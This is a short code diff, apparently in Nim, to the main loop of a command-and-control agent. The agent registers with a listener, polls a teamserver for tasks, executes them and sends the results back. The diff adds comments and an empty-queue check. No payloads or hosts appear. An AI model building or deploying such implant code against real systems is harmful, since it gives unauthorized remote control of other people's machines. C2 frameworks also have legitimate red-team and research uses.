@@ -14,6 +14,8 @@ proc main() =
         4. Agent moves into an infinite loop, which is only exited when the agent is tasked to terminate
     ]#  
 
+    # TODO: Read data from configuration file
+
     let listener = "NVIACCXB"
     let agent = register(listener)
     echo fmt"[+] [{agent}] Agent registered."
@@ -33,8 +35,14 @@ proc main() =
         let date: string = now().format("dd-MM-yyyy HH:mm:ss")
         echo fmt"[{date}] Checking in."
 
+        # Retrieve task queue from the teamserver for the current agent
         let tasks: seq[Task] = getTasks(listener, agent)
 
+        if tasks.len <= 0: 
+            echo "[*] No tasks to execute."
+            continue 
+        
+        # Execute all retrieved tasks and return their output to the server
         for task in tasks: 
             let result = task.handleTask()
 
